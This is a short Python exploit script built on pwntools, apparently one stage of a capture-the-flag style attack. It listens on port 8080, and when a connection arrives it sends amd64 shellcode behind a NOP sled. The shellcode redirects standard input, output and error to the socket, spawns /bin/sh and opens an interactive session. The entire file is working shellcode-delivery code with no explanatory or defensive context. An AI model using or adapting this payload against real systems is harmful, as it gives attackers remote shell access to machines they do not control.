

from pwn import *

context.arch = 'amd64'

l = listen(8080, "0.0.0.0")

l.wait_for_connection()

sc = shellcraft.dup2('rdi', 0)
sc += shellcraft.dup2('rdi', 1)
sc += shellcraft.dup2('rdi', 2)
sc += shellcraft.sh()
sc = b'\x90'*0x100 + asm(sc)

l.sendline(sc)

l.interactive()
